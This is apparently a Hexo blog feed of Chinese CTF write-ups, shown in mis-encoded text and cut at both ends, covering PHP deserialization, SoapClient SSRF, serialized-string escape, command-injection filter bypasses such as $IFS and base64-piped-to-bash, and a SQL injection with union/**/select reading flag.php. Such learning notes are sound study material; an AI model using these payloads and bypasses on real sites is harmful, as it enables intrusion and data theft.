æˆäº†æ­§ä¹‰ï¼Œå¯¼è‡´å…¶åœ¨è§£æsessionæ–‡ä»¶æ—¶ç›´æ¥å¯¹â€™|â€™åçš„å€¼è¿›è¡Œååºåˆ—åŒ–å¤„ç†ã€‚</p><p>è¿™é‡Œå¯èƒ½ä¼šæœ‰ä¸€ä¸ªå°ç–‘é—®ï¼Œä¸ºä»€ä¹ˆåœ¨è§£æsessionæ–‡ä»¶æ—¶ç›´æ¥å¯¹â€™|â€™åçš„å€¼è¿›è¡Œååºåˆ—åŒ–å¤„ç†ï¼Œè¿™ä¹Ÿæ˜¯å¤„ç†å™¨çš„åŠŸèƒ½ï¼Ÿè¿™ä¸ªå…¶å®æ˜¯å› ä¸ºsession_start()è¿™ä¸ªå‡½æ•°ï¼Œå¯ä»¥çœ‹ä¸‹å®˜æ–¹è¯´æ˜ï¼š</p><p>å½“ä¼šè¯è‡ªåŠ¨å¼€å§‹æˆ–è€…é€šè¿‡ session_start() æ‰‹åŠ¨å¼€å§‹çš„æ—¶å€™ï¼Œ PHP å†…éƒ¨ä¼šè°ƒç”¨ä¼šè¯ç®¡ç†å™¨çš„ open å’Œ read å›è°ƒå‡½æ•°ã€‚ ä¼šè¯ç®¡ç†å™¨å¯èƒ½æ˜¯ PHP é»˜è®¤çš„ï¼Œ ä¹Ÿå¯èƒ½æ˜¯æ‰©å±•æä¾›çš„ï¼ˆSQLite æˆ–è€… Memcached æ‰©å±•ï¼‰ï¼Œ ä¹Ÿå¯èƒ½æ˜¯é€šè¿‡ session_set_save_handler() è®¾å®šçš„ç”¨æˆ·è‡ªå®šä¹‰ä¼šè¯ç®¡ç†å™¨ã€‚ é€šè¿‡ read å›è°ƒå‡½æ•°è¿”å›çš„ç°æœ‰ä¼šè¯æ•°æ®ï¼ˆä½¿ç”¨ç‰¹æ®Šçš„åºåˆ—åŒ–æ ¼å¼å­˜å‚¨ï¼‰ï¼ŒPHP ä¼šè‡ªåŠ¨ååºåˆ—åŒ–æ•°æ®å¹¶ä¸”å¡«å…… $_SESSION è¶…çº§å…¨å±€å˜é‡</p><p>å› æ­¤æˆ‘ä»¬æˆåŠŸè§¦å‘äº†testç±»ä¸­çš„__wakeup()æ–¹æ³•,æ‰€ä»¥è¿™ç§æ”»å‡»æ€è·¯æ˜¯å¯è¡Œçš„ã€‚</p><p>å›åˆ°é¢˜ç›®</p><p>æˆ‘ä»¬é¦–å…ˆè®¿é—®/index.php,ç”Ÿæˆcookieï¼Œç„¶åä¼ å…¥limit=æˆ‘ä»¬åºåˆ—åŒ–çš„å­—ç¬¦ä¸²ï¼Œç„¶åè®¿é—®check.php,å› ä¸ºè¿™é‡Œæœ‰</p><p><img src="10.PNG"></p><p>æœ€åç”Ÿæˆlog-1.php,è®¿é—®æºç å¾—åˆ°flag</p><p>264</p><p>å°±è·Ÿ262ä¸€æ ·ï¼Œä¼ ä¸ªcookieå€¼å°±å¥½äº†ï¼Œè®°å¾—å¼•å·è¦ç¼–ç </p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ååºåˆ—åŒ– ctfshow 258ï¼Œ259ï¼Œ260ï¼Œ261</title>
      <link href="/2021/03/10/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2021/03/10/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<p>#å‰è¨€</p><span id="more"></span><p>258</p><p><img src="1.PNG"></p><p>è®¾ç½®usernameï¼Œpasswordï¼Œuseråœ¨cookieååºåˆ—åŒ–ï¼Œæ­£åˆ™[oc]:\d+:/iâ€™ï¼Œå°±æ˜¯ä¸èƒ½è¾“å…¥ o:4:ä¹‹ç±»çš„ï¼Œå¯ä»¥é€šè¿‡åœ¨oåé¢æ·»åŠ +ç»•è¿‡<br>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°åœ¨__constructè¿™é‡Œæ˜¯newä¸€ä¸ªinfoï¼ˆï¼‰ç±»ï¼Œä½†æ˜¯åœ¨backdoorè¿™é‡Œæœ‰evalï¼Œè¿™æ‰æ˜¯æˆ‘ä»¬æƒ³è¦çš„ã€‚<br>æ‰€ä»¥</p><p><img src="2.PNG"></p><p>è®°å¾—åœ¨oåé¢åŠ ä¸Š+å·çš„ç¼–ç %2b</p><p>259</p><p>åƒä¸‡è®°å¾—ï¼Œå†™å®Œä¹‹åè¦ä¿å­˜ï¼Œå†™äº†é‚£ä¹ˆå¤šçš„ä¸œè¥¿å…¨æ²¡äº†</p><p>è¿™é“é¢˜åˆ©ç”¨äº†phpååºåˆ—åŒ–ï¼ŒåŸç”Ÿç±»soapclient.</p><p><img src="3.png"></p><p>soapclient(null,location,uli)</p><p><img src="4.PNG"></p><p>å°±è¯´ä¸‹æ€è·¯ï¼Œ</p><p><img src="5.PNG"></p><p>æ‰“å¼€é¢˜ç›®å•¥éƒ½æ²¡æœ‰ï¼Œå°±è¯´è®©ååºåˆ—åŒ–ï¼Œå°±æ²¡æœ‰ç»™ç±»ï¼Œæ‰€ä»¥æˆ‘ä»¬å°±åº”è¯¥å»æƒ³å†…ç½®ç±»ï¼Œé¢˜ç›®ç»™äº†æºç </p><p><img src="6.PNG"></p><p>flag.php</p><p>$xff = explode(â€˜,â€™, $_SERVER[â€˜HTTP_X_FORWARDED_FORâ€™]);<br>//æŠŠä¼ è¿‡æ¥çš„ipç”¨â€˜ï¼Œâ€™ï¼Œåˆ†å‰²ï¼Œå½¢æˆæ•°ç»„</p><p>array_pop($xff);//å»æ‰æ•°ç»„çš„æœ€åä¸€é¡¹</p><p>$ip = array_pop($xff);</p><p>if($ip!==â€™127.0.0.1â€™){</p><p> die(â€˜errorâ€™);//Ip=127.0.0.1</p><p>}else{</p><p>  $token = $_POST[â€˜tokenâ€™];//postä¼ å‚ï¼Œä½¿å¾—token=ctfshow</p><p>  if($token==â€™ctfshowâ€™){</p><p>  file_put_contents(â€˜flag.txtâ€™,$flag);è¯»å–flag.php<br>  }<br>}</p><p>ä½¿ç”¨soapclient cluf ssrf</p><p>new soapclientï¼Œè®©ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºnullï¼Œè¿™æ ·æˆ‘ä»¬å¯ä»¥ä½¿ç”¨locationå»æ„é€ ssrfï¼Œ<a href="http://127.0.0.1/flag.php,%E7%84%B6%E5%90%8E%E4%BC%A0%E5%85%A5%E6%88%91%E4%BB%AC%E8%87%AA%E5%B7%B1%E6%9E%84%E9%80%A0%E7%9A%84post%E8%AF%B7%E6%B1%82%EF%BC%8C/r/n%E6%98%AF%E5%9B%9E%E8%BD%A6%EF%BC%8C%E4%B8%A4%E4%B8%AA/r/n%E5%B0%B1%E5%8F%AF%E4%BB%A5%E5%8E%BB%E8%BF%9B%E8%A1%8C%E8%87%AA%E5%B7%B1%E6%9E%84%E9%80%A0%E8%AF%B7%E6%B1%82%E7%88%86">http://127.0.0.1/flag.php,ç„¶åä¼ å…¥æˆ‘ä»¬è‡ªå·±æ„é€ çš„postè¯·æ±‚ï¼Œ\r\næ˜¯å›è½¦ï¼Œä¸¤ä¸ª\r\nå°±å¯ä»¥å»è¿›è¡Œè‡ªå·±æ„é€ è¯·æ±‚çˆ†</a></p><p><img src="4.PNG"></p><p>æˆ‘è‡ªå·±å†™çš„æ˜¯ç›´æ¥ä¼ çš„\r\n,è€Œä¸æ˜¯åæ¥åœ¨æ›¿æ¢ï¼Œæ‰€ä»¥ä¸€å¼€å§‹åºåˆ—åŒ–å‡ºæ¥çš„ä¸œè¥¿æ˜¯ä¸å®Œæ•´çš„</p><p>260</p><p>ç›´æ¥ä¼ å…¥ctfhsow=ctfshow_i_love_36Då°±å¯ä»¥äº†</p><p>262</p><p>è¿™ä¸ªæ˜¯åˆ©ç”¨äº†å­—ç¬¦ä¸²é€ƒé€¸</p><p>mdï¼Œè¿™é“é¢˜çš„æç¤ºå±…ç„¶åœ¨æ³¨é‡Šé‡Œï¼Œç»äº†</p><p><img src="7.PNG"></p><p><img src="8.PNG"></p><p>è¿™ä¸ªæºç æŒºç®€å•çš„ï¼Œå°±æ˜¯ï¼Œè¯´å¦‚æœtoken==â€™adminâ€™ï¼Œå°±è¾“å‡ºflag</p><p><img src="9.PNG"></p><p>æˆ‘ä»¬å¯ä»¥åšä¸€ä¸ªå®éªŒ</p><p><img src="10.PNG"></p><p><img src="11.PNG"></p><p>çœ‹è¿™é‡Œï¼Œæ˜¯ä¸æ˜¯æœ‰ç‚¹å¥‡æ€ªï¼Œä¸ºä»€ä¹ˆè¦æœ‰fuckï¼Œä¸ºä»€ä¹ˆè¦æŠŠfuckæ¢ä½loveuï¼Œè€ŒLOVEUæ¯”fuckå¤šäº†ä¸€ä½</p><p><img src="12.PNG"></p><p>å› ä¸ºtokenè¿™ä¸ªåœ¨contructé‡Œé¢æ²¡æœ‰ï¼Œå¹¶ä¸å—æˆ‘ä»¬æ§åˆ¶ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥æ§åˆ¶å…¶ä»–ä¸‰ä¸ªå±æ€§å•Šï¼Œåˆæ˜¯ä¸€ä¸ªè·Ÿé—­åˆæœ‰å…³çš„</p><p>è¿˜è®°å¾—æˆ‘ä»¬åˆšæ‰çš„å®éªŒç»“æœå˜›ï¼šO:7:â€messageâ€:4:{s:4:â€fromâ€;s:1:â€1â€;s:3:â€msgâ€;s:1:â€1â€;s:2:â€toâ€;s:1:â€1â€;<mark>s:5:â€tokenâ€;s:4:â€userâ€</mark>;}</p><p>å¦‚æœæˆ‘ä»¬ä¼ å…¥(27ä¸ªfuckï¼Œå› ä¸ºâ€;s:5:â€tokenâ€;s:4:â€userâ€;}ï¼Œä¸€å…±27ä¸ªå­—ç¬¦ï¼Œéœ€è¦æˆ‘ä¹ˆä¼ å…¥27ä¸ªå­—ç¬¦å»åƒæ‰åé¢çš„ï¼Œä¸ºå…¶è…¾ä½ç½®)</p><p>f=1&amp;m=1&amp;t=fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckâ€;s:5:â€tokenâ€;s:5:â€adminâ€;}</p><p>ç»“æœO:7:â€messageâ€:4:{s:4:â€fromâ€;s:1:â€1â€;s:3:â€msgâ€;s:1:â€1â€;s:2:â€toâ€;s:134:â€fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck;s:5:â€tokenâ€;s:5:â€adminâ€;}â€;s:5:â€tokenâ€;s:4:â€userâ€;}</p><p>é‚£æˆ‘ä»¬ç°åœ¨åŠ ä¸Šæ›¿æ¢</p><p>O:7:â€messageâ€:4:{s:4:â€fromâ€;s:1:â€1â€;s:3:â€msgâ€;s:1:â€1â€;s:2:â€toâ€;s:134:â€loveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUâ€;s:5:â€tokenâ€;s:5:â€adminâ€;}â€;s:5:â€tokenâ€;s:4:â€userâ€;}</p><p>æ³¨æ„s:134éƒ½æ˜¯134ä¸ªå­—ç¬¦æ²¡æœ‰æ”¹å˜ã€‚é‚£æˆ‘ä»¬åœ¨ååºåˆ—åŒ–çš„æ—¶å€™ï¼ŒæœåŠ¡å™¨ä¸€å®šä¼šè®¤å‡†134è¿™ä¸ªé•¿åº¦ï¼Œåé¢å½¢æˆé—­åˆï¼Œè‡ªåŠ¨èˆå»ï¼Œäºæ˜¯æˆ‘ä»¬å°±æ˜¯æ”¹å˜tokençš„å€¼ï¼Œå¾—åˆ°è®¿é—®message.php,å¾—åˆ°flag</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ezpop</title>
      <link href="/2021/03/08/pop%E9%93%BE/"/>
      <url>/2021/03/08/pop%E9%93%BE/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><p>#å‰è¨€</p><p>ä»Šå¤©åˆæ˜¯åšä¸å‡ºæ¥é¢˜ç›®çš„ä¸€å¤©</p><!--more--><p><img src="1.PNG"></p><p>POPé“¾é€†å‘åˆ†æ</p><p><img src="2.png"></p><p><img src="3.PNG"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>henuctf</title>
      <link href="/2021/03/08/henuctf/"/>
      <url>/2021/03/08/henuctf/</url>
      
        <content type="html"><![CDATA[<p>#å‰è¨€<br>æˆ‘çŸ¥é“æˆ‘å¾ˆèœï¼Œä½†æ˜¨å¤©æˆ‘æ„è¯†åˆ°äº†æˆ‘è¿˜ä¸æ˜¯ä¸€èˆ¬çš„èœ</p><span id="more"></span><h2>mai</h2><p>æ¥çœ‹çœ‹èœé¸¡çš„åšé¢˜æ€è·¯ï¼Œæˆ‘ä¸‹è½½<a href="http://www.zipä¹‹å/">www.zipä¹‹å</a></p><p><img src="1.PNG"></p><p>æˆ‘å‰å‡ å¤©é‡è§è¿‡tostring()è¿™ä¸ªå‡½æ•°ï¼Œæˆ‘çŸ¥é“ï¼Œå½“æŠŠç±»å½“ä½œå­—ç¬¦ä¸²è¾“å‡ºçš„æ—¶å€™ï¼Œä¼šè‡ªåŠ¨è°ƒç”¨è¿™ä¸ªå‡½æ•°ï¼Œå¦‚æœç»“å°¾æ˜¯echo(unserialize($_GET[â€˜henuâ€™])),å°±å¯ä»¥ç›´æ¥è¾“å‡ºkeyå€¼ï¼Œé‚£ä¹ˆæ¥ä¸‹åç€å°±éå¸¸é¡ºåˆ©ï¼Œä½†æ˜¯æ²¡æœ‰å°±å¡åœ¨è¿™é‡Œäº†ï¼Œæœ€æœ€æœ€å…³é”®çš„ä¸€æ­¥ä¸ä¼šï¼Œå°±å¾ˆéš¾å—ï¼Œçœ‹wpæœç„¶æ˜¯popé“¾ï¼Œæˆ‘å½“æ—¶åšé¢˜ï¼Œåœ¨æŸ¥èµ„æ–™çš„æ—¶å€™åœ¨ç½‘ä¸Šçœ‹åˆ°äº†popé“¾ï¼Œaaaaaï¼Œè¿˜æ˜¯æ²¡æœ‰è€å¿ƒçœ‹å®Œé‚£ä¹ˆé•¿çš„æ–‡ç« ï¼Œç°åœ¨æ¥å­¦ä¹ ä¸€ä¸‹</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ping ping ping</title>
      <link href="/2021/03/07/ping/"/>
      <url>/2021/03/07/ping/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><p>æ„Ÿè§‰è¿™é“é¢˜åšäº†2æ¬¡ï¼Œè¿˜æ˜¯å¯¹æŸäº›å‘½ä»¤ä¸äº†è§£</p><p>ä¸‹é¢å°±æ‰¾äº†ä¸€ä½å¸ˆå‚…çš„æ–‡ç« ï¼Œç³»ç»Ÿçš„å­¦ä¹ ä¸€ä¸‹</p><h2>å¸¸è§çš„ç®¡é“ç¬¦</h2><h3>windows</h3><li>|:ç›´æ¥æ‰§è¡Œåé¢çš„è¯­å¥ï¼ˆå¿…é¡»ä¿è¯å‰é¢æ˜¯çœŸï¼‰<li>||:å¦‚æœå‰é¢æ˜¯é”™çš„ï¼Œå°±ç›´æ¥æ‰§è¡Œåé¢çš„è¯­å¥ï¼Œå¦åˆ™å°±å‰é¢<li>&ï¼šæ— è®ºçœŸå‡éƒ½æ‰§è¡Œ<li>&&ï¼šå¦‚æœå‰é¢æ˜¯å‡ï¼Œåˆ™ä¸¤æ¡éƒ½ä¸æ‰§è¡Œï¼Œå¦‚æœæ˜¯çœŸåˆ™æ‰§è¡Œä¸¤æ¡(pså¦‚æœç®¡é“ç¬¦è¢«è¿‡æ»¤å¯ä»¥å°è¯•ä¸€ä¸‹%0a,æ¢è¡Œç¬¦ç»•è¿‡)<h3>linux</h3><p>å¤šäº†ä¸€ä¸ªï¼›ï¼Œè·Ÿ&amp;ä¸€æ ·</p><h2>ç©ºæ ¼è¿‡æ»¤</h2><li>$IFS$9<li>${IFS}<LI>%09(éœ€è¦phpç¯å¢ƒ)<li>é‡å®šå‘ç¬¦<>,<(è¿™ä¸ªå°è¯•åå¥½åƒä¸è¡Œï¼Œä½†æ˜¯å¸ˆå‚…åšçš„å¯ä»¥ï¼ˆroot@kali:~# cat<>flag<p>this is your flag )(æœ‰å¸¸è¯†äº†ä¸€ä¸‹ï¼Œcat&lt;flagå¯ä»¥ï¼Œä½†æ˜¯cat&lt;flag.htmä¸è¡Œï¼Œç°åœ¨è¯•è¯•cat f.php,cat flagæ˜¯å¯ä»¥çš„ï¼Œæ™šä¸Šå›æ¥äº†åœ¨ç ”ç©¶ç ”ç©¶)</p><h2>é»‘åå•ç»•è¿‡</h2><h3>æ‹¼æ¥</h3>a=c;b=at;c=fl;d=ag;$a$b $c$d<h3>base64ç¼–ç </h3>\`echo Y2F0IGZsYWc=|base64 -d\`<p>echo Y2F0IGZsYWc=|base64 -d|bash</p><p>echo Y2F0IGZsYWc=|base64 -d|sh</p><h3>å•å¼•å·å’ŒåŒå¼•å·</h3><p>câ€â€at flâ€™â€™ag</p><h3>åæ–œçº¿</h3><p>c\at fl\ag</p><h3>$1,$2ç­‰å’Œ$@</h3><p>c$1at f$@lag</p><h3>è¯»æ–‡ä»¶ç»•è¿‡</h3><p>(1)more:ä¸€é¡µä¸€é¡µçš„æ˜¾ç¤ºæ¡£æ¡ˆå†…å®¹</p><p>(2)less:ä¸ more ç±»ä¼¼ï¼Œä½†æ˜¯æ¯” more æ›´å¥½çš„æ˜¯ï¼Œä»–å¯ä»¥[pg dn][pg up]ç¿»é¡µ</p><p>(3)head:æŸ¥çœ‹å¤´å‡ è¡Œ</p><p>(4)tac:ä»æœ€åä¸€è¡Œå¼€å§‹æ˜¾ç¤ºï¼Œå¯ä»¥çœ‹å‡º tac æ˜¯ cat çš„åå‘æ˜¾ç¤º</p><p>(5)tail:æŸ¥çœ‹å°¾å‡ è¡Œ</p><p>(6)nlï¼šæ˜¾ç¤ºçš„æ—¶å€™ï¼Œé¡ºä¾¿è¾“å‡ºè¡Œå·</p><p>(7)od:ä»¥äºŒè¿›åˆ¶çš„æ–¹å¼è¯»å–æ¡£æ¡ˆå†…å®¹</p><p>(8)vi:ä¸€ç§ç¼–è¾‘å™¨ï¼Œè¿™ä¸ªä¹Ÿå¯ä»¥æŸ¥çœ‹</p><p>(9)vim:ä¸€ç§ç¼–è¾‘å™¨ï¼Œè¿™ä¸ªä¹Ÿå¯ä»¥æŸ¥çœ‹</p><p>(10)sort:å¯ä»¥æŸ¥çœ‹</p><p>(11)uniq:å¯ä»¥æŸ¥çœ‹</p><p>(12)file -f:æŠ¥é”™å‡ºå…·ä½“å†…å®¹</p><h3>é€šé…ç¬¦ç»•è¿‡</h3><p>root@kali:~# /???/?[a][t] ?â€™â€™?â€™â€™?â€™â€™?â€™â€™</p><p>this is your flag</p><p>xx</p><p>cc</p><p>xa</p><p>/bin/cat: test: æ˜¯ä¸€ä¸ªç›®å½•</p><p>root@kali:~# /???/?at flag</p><p>this is your flag</p><p>xx</p><p>cc</p><p>xa</p><p>root@kali:~# /???/?at ????</p><p>this is your flag</p><p>xx</p><p>cc</p><p>xa</p><p>/bin/cat: test: æ˜¯ä¸€ä¸ªç›®å½•</p><p>root@kali:~# /???/?[a]â€™â€™[t] ?â€™â€™?â€™â€™?â€™â€™?â€™â€™</p><p>this is your flag</p><p>xx</p><p>cc</p><p>xa</p><p>/bin/cat: test: æ˜¯ä¸€ä¸ªç›®å½•</p><h3>å†…æ•›æ‰§è¡Œç»•è¿‡</h3>\`å‘½ä»¤\`å’Œ$(å‘½ä»¤)éƒ½æ˜¯æ‰§è¡Œæ–¹å¼<p>echo â€œxx`pwd`â€œ</p><p>echo â€œxx$(pwd)â€</p><h3>ç»•è¿‡é•¿åº¦é™åˆ¶</h3><p>è§åŸåšå®¢</p><h3>linuxä¸­å‘½ä»¤æ¢è¡Œ</h3>åœ¨linuxï¼Œä½†æˆ‘ä»¬æ‰§è¡Œæ–‡ä»¶çš„æ—¶å€™ï¼Œæˆ‘ä»¬é€šè¿‡åœ¨æ²¡æœ‰å†™å®Œçš„å‘½ä»¤åé¢åŠ \ï¼Œå¯ä»¥å°†ä¸€æ¡å‘½ä»¤å†™å¤šè¡Œroot@kali:~# ca\<p>t\</p><p>fl\</p><p>ag</p><p>this is your flag</p><p>æ—¢ç„¶å¯ä»¥è¿™æ ·é‚£æˆ‘ä»¬æ˜¯ä¸æ˜¯å¯ä»¥åœ¨æŸäº›é™åˆ¶é•¿åº¦çš„æƒ…å†µä¸‹æ‰§è¡Œå‘½ä»¤ï¼Œå°†å‘½ä»¤ä¸€æ¡ä¸€æ¡è¾“å…¥ä¸€ä¸ªæ–‡æœ¬ä¸­å†æ‰§è¡Œï¼Œå°è¯•ä¸€ä¸‹</p><p>root@kali:~# echo â€œca\â€œ&gt;cmd</p><p>root@kali:~# echo â€œt\â€œ&gt;&gt;cmd</p><p>root@kali:~# echo â€œ fl\â€œ&gt;&gt;cmd</p><p>root@kali:~# echo â€œagâ€&gt;&gt;cmd</p><p>root@kali:~# cat cmd</p><p>ca\</p><p>t\</p><p> fl\</p><p>ag</p><p>root@kali:~# sh cmd</p><p>this is your flag</p><p>ç”¨è¿™ç§æ–¹æ³•å¯ä»¥ç»•è¿‡ä¸€äº›é•¿åº¦é™åˆ¶è¯»å–æ–‡ä»¶å†…å®¹</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ssrf(ç®€å•çš„åšä¸€ä¸‹)</title>
      <link href="/2021/03/07/ssrf-%E7%AE%80%E5%8D%95%E7%9A%84%E5%81%9A%E4%B8%80%E4%B8%8B/"/>
      <url>/2021/03/07/ssrf-%E7%AE%80%E5%8D%95%E7%9A%84%E5%81%9A%E4%B8%80%E4%B8%8B/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><p><img src="1.PNG"></p><p>è¿™é‡Œé¢çš„å‡ ä¸ªå‡½æ•°ï¼Œä¸Šä¸ªé¢˜ç›®åšçš„æ—¶å€™å·²ç»ä»‹ç»è¿‡ï¼Œæ•´æ®µä»£ç å°±æ˜¯è¾“å…¥urlæŠŠè¿™ä¸ªç•Œé¢çš„å†…å®¹è¾“å‡º</p><p>æˆ‘ä»¬è¾“å…¥<br>url=127.0.0.1,ä¼šå‘ç°å®ƒåˆæŠŠæ•´ç«¯ä»£ç ä»æ–°è¿”å›äº†ä¸€ä¸‹</p><p>æ‰€ä»¥æˆ‘ä»¬å°è¯•è¾“å…¥127.0.0.1/flag.php,å‘ç°å¾—åˆ°äº†flag</p><p><img src="2.PNG"></p><p>è¿™ç‚¹æˆ‘ä»¬å‘ç°ã€‚å®ƒä¸èƒ½è¾“å…¥127.0.0.1.è€Œä¸”è¿˜è¦ä¸€http://</p><p>å¸¸è§çš„ç»•è¿‡æœ‰<br>127.0.1ï¼Œ127.1ï¼Œ127ã€‚0.0.1,è¿˜æœ‰å¯ä»¥åŒ–ä¸º16è¿›åˆ¶æˆ–äºŒè¿›åˆ¶</p><p><a href="https://tool.520101.com/wangluo/jinzhizhuanhuan/">https://tool.520101.com/wangluo/jinzhizhuanhuan/</a></p><p>ipè¿›åˆ¶è½¬æ¢åœ°å€</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>[2018]Fakebook</title>
      <link href="/2021/03/07/2018-Fakebook/"/>
      <url>/2021/03/07/2018-Fakebook/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><p>æ‰“å¼€ç•Œé¢äº†è§£åŠŸèƒ½ï¼Œæœ‰æ³¨å†Œï¼Œç™»å½•é¡µé¢ï¼Œæ³¨å†Œçš„æ—¶å€™ï¼Œå› ä¸ºblogçš„æ ¼å¼ä¸€ç›´æœªçŸ¥ï¼Œå°±ä¸€ç›´ä¸èƒ½æ³¨å†ŒæˆåŠŸï¼Œè¿™æ—¶å€™æƒ³åˆ°è¿›è¡Œæ‰«æç›®å½•</p><p>æ‰«å‡ºuser.php.bak,ä¸‹è½½æºç </p><p><img src="1.PNG"></p><p>ä»£ç å®¡è®¡ï¼Œæœ‰ä¸ªssrfçš„æ¼æ´ï¼Œè¿™ä¸ªurlæ˜¯æˆ‘ä»¬è‡ªå·±æ§åˆ¶çš„ï¼Œæœ‰ä¸ªå…³äºblogçš„æ­£åˆ™åŒ¹é…ï¼Œæˆ‘ä»¬çŸ¥é“è¿™ä¸ªblogå¿…é¡»æ˜¯ä»¥httpï¼ˆsï¼‰å¼€å¤´çš„</p><p>ç„¶åæˆåŠŸæ³¨å†Œï¼Œç‚¹å‡»æ³¨å†Œä¿¡æ¯ï¼Œå‘ç°urlæœ‰sqlæ³¨å…¥ï¼Œå¤šå¤šå…³æ³¨urlçš„å˜åŒ–ï¼Œè·Ÿæ˜¨å¤©åšçš„é‚£é“é¢˜ï¼Œæ³¨æ„urlçš„å˜åŒ–</p><p>å‘ç°union selectè¿åœ¨ä¸€èµ·çš„æ—¶å€™ä¼šè¢«è¿‡æ»¤ï¼Œä½†æ˜¯å¦‚æœæ˜¯å•ç‹¬å­˜åœ¨çš„æ—¶å€™å°±ä¸ä¼šè¢«è¿‡ç‡ã€‚å­¦åˆ°ä¸€ä¸ªæ–°å§¿åŠ¿ï¼Œå¦‚æœunion selectè¿è½½ä¸€èµ·çš„æ—¶å€™å¯ä»¥æ—¶å€™ union / * * /selectè¿›è¡Œç»•è¿‡</p><p>ç„¶åè¿›è¡ŒæŠ¥é”™æ³¨å…¥</p><p><img src="2.PNG"></p><p>æˆ‘ä»¬çœ‹åˆ°blogçš„åœ°æ–¹ï¼Œå­˜åœ¨ssrfæ³¨å…¥ï¼Œå¹¶ä¸”æˆ‘ä»¬å¯ä»¥çœ‹åˆ°/var/www/html/db.phpï¼Œæ‰€ä»¥è·¯å¾„æ˜¯/var/www/html/ï¼Œæ‰€ä»¥æˆ‘ä»¬åœ¨blogï¼Œå¡«å†™ä¸Šflag.phpçš„ä¿¡æ¯ä¾¿äºè¯»å–</p><p>O:8:â€UserInfoâ€:3:{s:4:â€nameâ€;s:1:â€2â€;s:3:â€ageâ€;i:0;s:4:â€blogâ€;s:29:â€file:///var/www/html/flag.phpâ€;}</p><p>ç„¶åæˆ‘ä»¬åœ¨urlé™¤è¿›è¡Œæ³¨å…¥?no=0 union/**/select 1,2,3,â€™O:8:â€UserInfoâ€:3:{s:4:â€nameâ€;s:1:â€2â€;s:3:â€ageâ€;i:0;s:4:â€blogâ€;s:23:â€file:///var/www/html/flag.phpâ€;}â€™</p><p>åªæœ‰å®Œæ•´çš„flag.phpçš„åå­—æ‰å¯ä»¥æˆåŠŸ</p><p>å¦å¤–æˆ‘ä»¬å†å†™å…ˆä¹°å‘¢çš„æ³¨å…¥çš„æ—¶å€™ï¼Œè®°å¾—æŠŠï¼Ÿno=0,-1,ä¸è¦å†™é‡Œé¢å·²ç»å­˜åœ¨çš„æ•°å­—</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>nizhuansiwei</title>
      <link href="/2021/03/06/nizhuansiwei/"/>
      <url>/2021/03/06/nizhuansiwei/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>checkin</title>
      <link href="/2021/03/06/checkin/"/>
      <url>/2021/03/06/checkin/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><p>å¯’å‡åšçš„ï¼Œå‘ç°è¿™é“æ²¡å†™wp</p><p>å°±æ˜¯æŒºç®€å•çš„</p><p>æœ‰ç‚¹ï¼Œå®ƒè¯´&lt;? in contents,æˆ‘ç«Ÿç„¶æ²¡çœ‹æ‡‚è¿™å•¥æ„æ€ï¼Œç”¨phtmlå°±å¯ä»¥äº†</p><p>ç„¶åè®°å½•ä¸€ä¸‹ï¼Œæˆ‘å‘ç°ï¼Œæˆ‘æ€»æ˜¯ä¸çŸ¥é“åœ¨å“ªè¿›è¡Œæœ€åä¸€æ­¥çš„è¿æ¥</p><p>1.user.ini</p><p><a href="http://3fe77776-d4fa-4210-9999-ed8a8f74c9d3.node3.buuoj.cn/uploads/e320b013e12a70d708fbcd16e1e2c84c/index.php">http://3fe77776-d4fa-4210-9999-ed8a8f74c9d3.node3.buuoj.cn/uploads/e320b013e12a70d708fbcd16e1e2c84c/index.php</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>cacl</title>
      <link href="/2021/03/06/cacl-1/"/>
      <url>/2021/03/06/cacl-1/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>have a bad day</title>
      <link href="/2021/03/06/day/"/>
      <url>/2021/03/06/day/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><p>æ³¨æ„ï¼Œå¦‚æœæ²¡æœ‰æ–¹æ³•çš„æ—¶å€™ï¼Œå¯ä»¥è¿›è¡Œæ‰«æç›®å½•ï¼Œä¹Ÿå¯ä»¥å¯¹urlè¿›è¡Œä»”ç»†åœ°è§‚å¯Ÿ</p><p>ç‚¹å‡»ç¬¬ä¸€ä¸ªå›¾ç‰‡ï¼Ÿcategory=woofersï¼Œç¬¬äºŒä¸ªæ˜¯category=meowersï¼Œç„¶åå¯ä»¥å°è¯•ä¸€ä¸‹?category=flag,æ˜¾ç¤ºSorry, we currently only support woofers and meowers. ï¼Œæ‰€ä»¥åªèƒ½åœ¨è¿™ä¸¤ä¸ªèº«ä¸ŠåšåŠŸå¤«</p><p>å°è¯•?category=woofersâ€™</p><p>Warning: include(woofersâ€™.php): failed to open stream: No such file or directory in /var/www/html/index.php on line 37</p><p>Warning: include(): Failed opening â€˜woofersâ€™.phpâ€™ for inclusion (include_path=â€™.:/usr/local/lib/phpâ€™) in /var/www/html/index.php on line 